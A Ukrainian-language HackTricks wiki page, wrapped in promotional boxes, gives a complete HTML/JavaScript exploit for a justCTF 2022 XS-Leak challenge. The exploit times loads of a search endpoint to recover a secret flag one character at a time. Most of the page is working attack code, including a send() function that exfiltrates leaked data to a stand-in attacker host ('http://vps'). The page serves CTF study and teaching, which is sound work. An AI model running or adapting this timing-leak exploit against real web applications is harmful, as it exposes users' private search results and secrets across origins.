# performance.now + –ü—Ä–∏–º—É—Å–æ–≤–µ –∑–∞–≤–¥–∞–Ω–Ω—è

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ, —â–æ–± –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É–≤–∞–ª–∞—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**–ï–∫—Å–ø–ª–æ–π—Ç –≤–∑—è—Ç–æ –∑ [https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/](https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)**

–£ —Ü—å–æ–º—É –≤–∏–∫–ª–∏–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º—ñ–≥ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —Ç–∏—Å—è—á—ñ —Å–∏–º–≤–æ–ª—ñ–≤, —ñ —è–∫—â–æ –ø—Ä–∞–ø–æ—Ä –º—ñ—Å—Ç–∏–≤—Å—è, —Å–∏–º–≤–æ–ª–∏ –±—É–ª–∏ –± –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ –Ω–∞–∑–∞–¥ –Ω–∞ –±–æ—Ç–∞. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—á–∏ –≤–µ–ª–∏–∫—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–∏–º–≤–æ–ª—ñ–≤, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º—ñ–≥ –≤–∏–º—ñ—Ä—è—Ç–∏, —á–∏ –º—ñ—Å—Ç–∏—Ç—å –ø—Ä–∞–ø–æ—Ä –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏–π —Ä—è–¥–æ–∫ —á–∏ –Ω—ñ.

{% hint style="warning" %}
–°–ø–æ—á–∞—Ç–∫—É —è –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–∏–≤ —à–∏—Ä–∏–Ω—É —Ç–∞ –≤–∏—Å–æ—Ç—É –æ–±'—î–∫—Ç–∞, –∞–ª–µ –ø—ñ–∑–Ω—ñ—à–µ –≤–∏—è–≤–∏–≤, —â–æ —Ü–µ –≤–∞–∂–ª–∏–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–∏–ø–æ–≤–∏–π —Ä–æ–∑–º—ñ—Ä –∑–∞–Ω–∞–¥—Ç–æ –º–∞–ª–∏–π, —â–æ–± –≤–ø–ª–∏–Ω—É—Ç–∏ –Ω–∞ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.
{% endhint %}
```html
<!DOCTYPE html>
<html>
<head>

</head>
<body>
<img src="https://deelay.me/30000/https://example.com">
<script>
fetch('https://deelay.me/30000/https://example.com')

function send(data) {
fetch('http://vps?data='+encodeURIComponent(data)).catch(err => 1)
}

function leak(char, callback) {
return new Promise(resolve => {
let ss = 'just_random_string'
let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000)
let start = performance.now()
let object = document.createElement('object');
object.width = '2000px'
object.height = '2000px'
object.data = url;
object.onload = () => {
object.remove()
let end = performance.now()
resolve(end - start)
}
object.onerror = () => console.log('Error event triggered');
document.body.appendChild(object);
})

}

send('start')

let charset = 'abcdefghijklmnopqrstuvwxyz_}'.split('')
let flag = 'justCTF{'

async function main() {
let found = 0
let notFound = 0
for(let i=0;i<3;i++) {
await leak('..')
}
for(let i=0; i<3; i++) {
found += await leak('justCTF')
}
for(let i=0; i<3; i++) {
notFound += await leak('NOT_FOUND123')
}

found /= 3
notFound /= 3

send('found flag:'+found)
send('not found flag:'+notFound)

let threshold = found - ((found - notFound)/2)
send('threshold:'+threshold)

if (notFound > found) {
return
}

// exploit
while(true) {
if (flag[flag.length - 1] === '}') {
break
}
for(let char of charset) {
let trying = flag + char
let time = 0
for(let i=0; i<3; i++) {
time += await leak(trying)
}
time/=3
send('char:'+trying+',time:'+time)
if (time >= threshold) {
flag += char
send(flag)
break
}
}
}
}

main()

</script>
</body>

</html>
```
<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –ß–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤–∏ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ, —â–æ–± –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É–≤–∞–ª–∞—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
